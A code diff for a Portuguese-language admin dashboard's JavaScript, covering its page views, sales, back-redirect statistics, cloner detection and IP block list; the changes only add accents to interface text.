     if (status) status.textContent = error.message || 'Falha ao gerar PIXs de teste.';
@@ -1687,9 +1642,9 @@ function pagesMarkup() {
   const list = adminOverview?.pagesList || [];
   return `
     <section class="admin-section-rs">
-      <div class="admin-section-head-rs"><h2>Paginas e eventos</h2><span>${list.length} bruto</span></div>
+      <div class="admin-section-head-rs"><h2>Páginas e eventos</h2><span>${list.length} bruto</span></div>
       <div class="admin-pages-rs">
-        ${pages.length ? pages.map((item) => `<div><strong>${escapeHtml(item.page)}</strong><span>${item.views} views</span></div>`).join('') : '<p class="admin-empty-rs">Nenhuma pagina registrada ainda.</p>'}
+        ${pages.length ? pages.map((item) => `<div><strong>${escapeHtml(item.page)}</strong><span>${item.views} views</span></div>`).join('') : '<p class="admin-empty-rs">Nenhuma página registrada ainda.</p>'}
       </div>
     </section>
   `;
@@ -1707,7 +1662,7 @@ function publicMarkup() {
           ${settingInput('public.country', 'Pais', pub.country)}
           ${settingInput('public.gender', 'Genero', pub.gender)}
           ${settingInput('public.minAge', 'Idade minima', pub.minAge, 'number')}
-          ${settingInput('public.maxAge', 'Idade maxima', pub.maxAge, 'number')}
+          ${settingInput('public.maxAge', 'Idade máxima', pub.maxAge, 'number')}
           ${settingInput('public.devices', 'Dispositivos / plataformas', pub.devices)}
           ${settingInput('public.interests', 'Interesses', pub.interests)}
         </div>
@@ -1758,7 +1713,7 @@ function salesMarkup() {
       </div>
     </section>
     <section class="admin-section-rs">
-      <div class="admin-section-head-rs"><h2>Ultimas vendas</h2><span>${items.length}</span></div>
+      <div class="admin-section-head-rs"><h2>Últimas vendas</h2><span>${items.length}</span></div>
       <div class="admin-table-wrap-rs"><table class="admin-table-rs"><thead><tr><th>Lead</th><th>Gateway</th><th>Valor</th><th>Status</th><th>Pago em</th></tr></thead><tbody>
         ${items.length ? items.map((item) => `<tr><td>${escapeHtml(item.lead?.name || item.sessionId || '-')}</td><td>${escapeHtml(item.gatewayLabel)}</td><td>${formatMoney(item.amount)}</td><td>${escapeHtml(item.status)}</td><td>${formatDate(item.paidAt)}</td></tr>`).join('') : '<tr><td colspan="5">Nenhuma venda paga ainda.</td></tr>'}
       </tbody></table></div>
@@ -1775,8 +1730,8 @@ function backredirectsMarkup() {
         <div class="admin-section-head-rs"><h2>Resumo</h2><span>${back.summary?.totalBack || 0}</span></div>
         <div class="admin-stats-rs">
           ${statCard('Voltas', back.summary?.totalBack || 0, 'eventos')}
-          ${statCard('Views base', back.summary?.totalViews || 0, 'paginas')}
-          ${statCard('Taxa media', `${back.summary?.avgRate || 0}%`, 'abandono')}
+          ${statCard('Views base', back.summary?.totalViews || 0, 'páginas')}
+          ${statCard('Taxa média', `${back.summary?.avgRate || 0}%`, 'abandono')}
         </div>
         <div class="admin-pages-rs">${(back.data || []).map((item) => `<div><strong>${escapeHtml(item.page)}</strong><span>${item.backTotal} voltas / ${item.rate}%</span></div>`).join('') || '<p class="admin-empty-rs">Sem backredirects registrados.</p>'}</div>
       </div>
@@ -1800,13 +1755,13 @@ function clonersMarkup() {
     <div class="admin-stats-rs admin-stats-rs--wide">
       ${statCard('Eventos', cloners.summary?.total || 0, 'total')}
       ${statCard('Alto risco', cloners.summary?.high || 0, 'bloquear')}
-      ${statCard('Medio risco', cloners.summary?.medium || 0, 'observar')}
+      ${statCard('Médio risco', cloners.summary?.medium || 0, 'observar')}
       ${statCard('Baixo risco', cloners.summary?.low || 0, 'ok')}
       ${statCard('Ultimo evento', formatShortDate(cloners.summary?.lastEventAt), 'clone')}
       ${statCard('Grupos', groups.length, 'ip/ua')}
     </div>
     <section class="admin-section-rs">
-      <div class="admin-section-head-rs"><h2>Sinais agrupados</h2><span>seguranca</span></div>
+      <div class="admin-section-head-rs"><h2>Sinais agrupados</h2><span>segurança</span></div>
       <div class="admin-table-wrap-rs"><table class="admin-table-rs"><thead><tr><th>Chave</th><th>Risco</th><th>Score</th><th>Eventos</th><th>Ultimo</th><th></th></tr></thead><tbody>
         ${groups.length ? groups.map((item) => `<tr><td>${escapeHtml(item.key)}</td><td><span class="admin-chip-rs">${escapeHtml(item.risk)}</span></td><td>${item.score}</td><td>${item.total}</td><td>${formatDate(item.lastEventAt)}</td><td>${item.ip ? `<button class="admin-row-button-rs" data-block-cloner="${escapeAttr(item.ip)}" type="button">Bloquear IP</button>` : ''}</td></tr>`).join('') : '<tr><td colspan="6">Nenhum sinal de clonagem registrado.</td></tr>'}
       </tbody></table></div>
@@ -1827,7 +1782,7 @@ function blacklistMarkup() {
     </section>
     <section class="admin-section-rs">
       <div class="admin-section-head-rs"><h2>IPs bloqueados</h2><span>manual</span></div>
-      <div class="admin-table-wrap-rs"><table class="admin-table-rs"><thead><tr><th>IP</th><th>Motivo</th><th>Sessao</th><th>Criado</th><th></th></tr></thead><tbody>
+      <div class="admin-table-wrap-rs"><table class="admin-table-rs"><thead><tr><th>IP</th><th>Motivo</th><th>Sessão</th><th>Criado</th><th></th></tr></thead><tbody>
         ${entries.length ? entries.map((entry) => `<tr><td>${escapeHtml(entry.ip)}</td><td>${escapeHtml(entry.reason || '-')}</td><td>${escapeHtml(entry.sessionId || '-')}</td><td>${formatDate(entry.createdAt)}</td><td><button class="admin-row-button-rs" data-remove-ip="${escapeAttr(entry.ip)}" type="button">Remover</button></td></tr>`).join('') : '<tr><td colspan="5">Nenhum IP bloqueado.</td></tr>'}
       </tbody></table></div>
     </section>
@@ -1872,14 +1827,14 @@ async function saveAdminSettings() {
     setDeep(patch, 'gateways.active', gatewayOrder[0]);
     setDeep(patch, 'gateways.activeGateway', gatewayOrder[0]);
   }
-  status.textContent = 'Salvando configuracoes...';
+  status.textContent = 'Salvando configurações...';
   try {
     const result = await adminFetch('/api/admin/settings', {
       method: 'POST',
       body: JSON.stringify({ settings: patch }),
     });
     adminSettings = result.settings || adminSettings;
-    status.textContent = 'Configuracoes salvas.';
+    status.textContent = 'Configurações salvas.';
     renderAdminPanel();
   } catch (error) {
     status.textContent = error.message || 'Falha ao salvar.';
